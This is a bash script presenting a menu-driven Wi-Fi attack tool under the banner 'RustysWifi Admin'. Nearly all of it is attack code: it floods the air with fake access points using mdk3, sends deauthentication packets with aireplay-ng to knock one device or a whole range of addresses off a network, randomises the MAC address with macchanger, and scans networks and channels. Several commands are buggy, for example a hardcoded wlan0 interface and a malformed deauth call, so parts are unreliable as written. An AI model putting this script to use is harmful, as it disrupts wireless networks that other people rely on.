#!/bin/bash
lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"


while :
do
clear
echo -e $lred""
cat << "EOF"
 /$$$$$$$                        /$$                               /$$      /$$ /$$  /$$$$$$  /$$
| $$__  $$                      | $$                              | $$  /$ | $$|__/ /$$__  $$|__/
| $$  \ $$ /$$   /$$  /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$      | $$ /$$$| $$ /$$| $$  \__/ /$$
| $$$$$$$/| $$  | $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/      | $$/$$ $$ $$| $$| $$$$    | $$
| $$__  $$| $$  | $$|  $$$$$$   | $$    | $$  | $$|  $$$$$$       | $$$$_  $$$$| $$| $$_/    | $$
| $$  \ $$| $$  | $$ \____  $$  | $$ /$$| $$  | $$ \____  $$      | $$$/ \  $$$| $$| $$      | $$
| $$  | $$|  $$$$$$/ /$$$$$$$/  |  $$$$/|  $$$$$$$ /$$$$$$$/      | $$/   \  $$| $$| $$      | $$
|__/  |__/ \______/ |_______/    \___/   \____  $$|_______/       |__/     \__/|__/|__/      |__/
                                         /$$  | $$                                               
                                        |  $$$$$$/                                               
                                         \______/                                                
EOF
echo -e $lred""
cat << "EOF"
  /$$$$$$        /$$               /$$          
 /$$__  $$      | $$              |__/          
| $$  \ $$  /$$$$$$$ /$$$$$$/$$$$  /$$ /$$$$$$$ 
| $$$$$$$$ /$$__  $$| $$_  $$_  $$| $$| $$__  $$
| $$__  $$| $$  | $$| $$ \ $$ \ $$| $$| $$  \ $$
| $$  | $$| $$  | $$| $$ | $$ | $$| $$| $$  | $$
| $$  | $$|  $$$$$$$| $$ | $$ | $$| $$| $$  | $$
|__/  |__/ \_______/|__/ |__/ |__/|__/|__/  |__/
                                                
EOF
echo -e $nc""
echo -e $lgreen"1)" $nc"Wifi Spam"
echo ""
echo -e $lgreen"2)" $nc"Deauth 1"
echo ""
echo -e $lgreen"3)" $nc"Deauth all"
echo ""
echo -e $lgreen"4)" $nc"Deauth Area"
echo ""
echo -e $lgreen"5)" $nc"Scan Networks"
echo ""
echo -e $lgreen"6)" $nc"Scan Channel"
echo ""
echo -e $lgreen"7)" $nc"Scan Lan"
echo ""
echo -e $lgreen"e)" $nc"exit"

read -p "-->> " player1
##############################################################################
if [[ $player1 == "1" ]]; then
clear
echo -e $lred""
echo "1) Use default word list"
echo ""
echo "2) Use your wordlist"
echo ""
echo "3) Use random SSIDs"
echo ""
read -p "-->> " wifiwl

if [[ $wifiwl == "1" ]]; then
echo "what is your interface?"
echo ""
read -p "-->>" interface

clear
echo "If you want to stop then press CTRL + C"
echo ""

echo "starting in 3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
echo "running..."

mon="mon"
interfacemon="$interface$mon"
ifconfig $interface down
ifconfig $interface up
macchanger -r $interface
airmon-ng start wlan0
mdk3 $interfacemon b -f ./SSIDS.txt -a -s 1000
airmon-ng stop $interfacemon
fi
if [[ $wifiwl == "2" ]]; then
echo -e $lred"Might not work!!!"
echo -e $lgreen"Please type the name of your own wordlist"
echo ""
read -p "-->>" OWN

echo "what is your interface?"
echo ""
read -p "-->>" interface

clear
echo "starting..."
echo ""
mon="mon"
interfacemon="$interface$mon"
ifconfig $interface down
ifconfig $interface up
macchanger -r $interface
airmon-ng start wlan0
mdk3 $interfacemon b -f ./$OWN -a -s $(wc -l $OWN | cut -f1 -d ' ')
airmon-ng stop $interfacemon
fi
if [[ $wifiwl == "3" ]]; then

echo "what is your interface?"
echo ""
read -p "-->>" interface

echo -e "How many SSIDs do you want?"
read -p "-->>" N

COUNT=1
while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
echo $(pwgen 14 1) >> "RANDOM_wordlist.txt"
let COUNT=COUNT+1
done
clear
echo -e "Starting process..."
echo " If you want to stop it, press CTRL+C."
echo " "
sleep 1
mon="mon"
interfacemon="$interface$mon"
ifconfig $interface down
ifconfig $interface up
macchanger -r $interface
airmon-ng start wlan0
mdk3 $interface b -f ./RANDOM_wordlist.txt -a -s $N
airmon-ng stop $interfacemon
fi

####
fi
####
##############################################################################
if [[ $player1 == "2" ]]; then
clear
echo -e $lred"Deauth 1"
echo ""
echo -e $lgreen"What is there network bssid"
read -p "-->>" networkbssid
echo "what is there ip"
read "-->>" thereip
echo starting...
sleep 2
aireplay-ng --deauth 0 -a $networkbssid -k $thereip
fi
if [[ $player1 == "3" ]]; then
clear
echo -e $lred"Deauth All"

echo -e $lgreen"What is your ip base"
echo "eg 192.168.1."
read -p "-->>" ipbase

echo -e $lgreen"What is the networkbssid"
read -p "-->>" networkbssid

c=
ipcount="$ipbase$c"

rm -r ips.txt
> ips.txt

for c in {1..1000}; do 
	echo "$ipcount$c" >> ips.txt
done

ips=`cat ips.txt`
aireplay-ng --deauth 0 -a $networkbssid -k $ips
sleep 10

fi
if [[ $player1 == "4" ]]; then
echo "coming soon"
sleep 3
fi
if [[ $player1 == "5" ]]; then
clear
echo -e $lred"Scan Networks"
echo ""
echo -e $lgreen"What is your interface:"
read -p "-->>" interface
echo "putting card in monitor mode"
sleep 1
airmon-ng check kill
airmon-ng start $interface
mon="mon"
interfacemon="$interface$mon"
echo "Done"
echo ""
echo "Starting Scan..."
sleep 1
airodump-ng $interfacemon
airmon-ng stop $interfacemon
fi
if [[ $player1 == "6" ]]; then
clear
echo -e $lred"Scan Channel"
echo ""
echo $lgreen"Whats your interface:"
read -p "-->>" interface
echo "putting card in monitor mode"
sleep 1
airmon-ng check kill
airmon-ng start $interface
mon="mon"
interfacemon="$interface$mon"
echo "Done"
echo ""
echo "What Channel:"
read -p "channel" channel
echo ""
echo "Starting Scan..."
sleep 1
airodump-ng -c $channel $interfacemon
sleep 3
airmon-ng stop $interfacemon
fi
if [[ $player1 == "7" ]]; then
clear
arp-scan -l
echo ""
echo -e $lred""
read -p "Press enter to exit..."
fi
if [[ $player1 == "e" ]]; then
exit 0
fi


done
